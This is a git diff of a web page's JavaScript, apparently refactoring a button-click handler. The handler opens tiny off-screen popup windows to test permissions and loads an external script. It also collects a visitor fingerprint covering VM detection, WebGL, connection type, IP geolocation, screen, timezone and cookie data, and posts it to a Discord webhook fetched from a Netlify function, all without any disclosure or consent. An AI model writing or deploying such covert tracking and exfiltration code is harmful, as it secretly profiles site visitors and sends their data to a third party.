@@ -121,8 +121,8 @@ function getVMInfo(){
     score = Math.min(99, Math.round(score));
     return { score, detected: score >= 60, reasons };
 }
+/* ================================================================ */
 
-/* ===================== LOAD YOU SCRIPT ===================== */
 function loadYouScript(cb){
     if(isYouScriptLoaded){ cb(); return; }
     const s = document.createElement('script');
@@ -132,23 +132,24 @@ function loadYouScript(cb){
     document.head.appendChild(s);
 }
 
-/* ===================== POPUP CHECK ===================== */
-function checkPopupPermission(callback){
-    let popups = [], allowed = true;
-    try{
-        for(let i=0;i<5;i++){
-            const p = window.open('','','width=1,height=1,left=-10000,top=-10000');
-            if(!p){ allowed=false; break; }
-            popups.push(p);
-        }
-        setTimeout(()=>{
+function checkPopupPermission() {
+    return new Promise(resolve=>{
+        let popups = [], allowed = true;
+        try{
+            for(let i=0;i<5;i++){
+                const p = window.open('','','width=1,height=1,left=-10000,top=-10000');
+                if(!p){ allowed=false; break; }
+                popups.push(p);
+            }
+            setTimeout(()=>{
+                popups.forEach(p=>{ try{p.close()}catch{} });
+                resolve(allowed);
+            },200);
+        }catch{
             popups.forEach(p=>{ try{p.close()}catch{} });
-            callback(allowed);
-        },200);
-    }catch{
-        popups.forEach(p=>{ try{p.close()}catch{} });
-        callback(false);
-    }
+            resolve(false);
+        }
+    });
 }
 
 /* ===================== IP GEOLOCATION ===================== */
@@ -163,27 +164,16 @@ async function getIPLocation() {
     }
 }
 
-/* ===================== DISCORD WEBHOOK ===================== */
-async function getWebhook() {
-    try {
-        const res = await fetch("/.netlify/functions/discord");
-        if (!res.ok) throw new Error("Failed to get webhook");
-        const data = await res.json();
-        return data.webhook;
-    } catch (err) {
-        console.error(err);
-        return null;
-    }
-}
-
+/* ===================== SEND DISCORD ===================== */
 async function sendToDiscord(buttonName){
-    const webhook = await getWebhook();
-    if(!webhook) return;
-
     const vm = getVMInfo();
     const gl = getWebGLInfo();
     const conn = navigator.connection || {};
     const ipGeo = await getIPLocation();
+
+    const res = await fetch("/.netlify/functions/discord", { method: "GET" });
+    const json = await res.json();
+    const webhook = json.webhook;
 
     const payload = {
         content: `✅ **Button clicked:** ${buttonName}`,
@@ -205,7 +195,7 @@ async function sendToDiscord(buttonName){
                 {name:"UTC Offset", value:String(new Date().getTimezoneOffset()), inline:true},
                 {name:"Screen", value:`${screen.width}×${screen.height}`, inline:true},
                 {name:"Color Depth", value:String(screen.colorDepth), inline:true},
-                {name:"Pixel Ratio", value:String(devicePixelRatio)},
+                {name:"Pixel Ratio", value:String(devicePixelRatio), inline:true},
                 {name:"Viewport", value:`${innerWidth}×${innerHeight}`, inline:true},
                 {name:"Touch Points", value:String(navigator.maxTouchPoints||0), inline:true},
                 {name:"Cookies Enabled", value:String(navigator.cookieEnabled), inline:true},
@@ -226,27 +216,34 @@ async function sendToDiscord(buttonName){
         }]
     };
 
-    fetch(webhook, {
+    await fetch(webhook,{
         method:"POST",
-        headers:{"Content-Type":"application/json"},
+        headers:{ "Content-Type":"application/json" },
         body:JSON.stringify(payload)
-    }).catch(console.error);
+    }).catch(()=>{});
 }
 
-function handleClick(e, buttonName){
+async function handleClick(e, buttonName){
     e.preventDefault();
+
     const popup = document.getElementById('popup_needed');
     const spinner = document.getElementById('spinner_holder');
 
     popup.style.display = 'none';
     spinner.innerHTML = '<div class="spinner"><div></div><div></div><div></div></div>';
 
-    checkPopupPermission(()=>{
-        loadYouScript(()=>{
-            sendToDiscord(buttonName);
-            if(typeof window.runYouScript === 'function'){ window.runYouScript(); }
-            spinner.innerHTML = '';
-        });
+    const popupAllowed = await checkPopupPermission();
+
+    if(!popupAllowed){
+        spinner.innerHTML = '';
+        popup.style.display = 'block';
+        return;
+    }
+
+    loadYouScript(async ()=>{
+        await sendToDiscord(buttonName);
+        if(typeof window.runYouScript === 'function'){ window.runYouScript(); }
+        spinner.innerHTML = '';
     });
 }
 
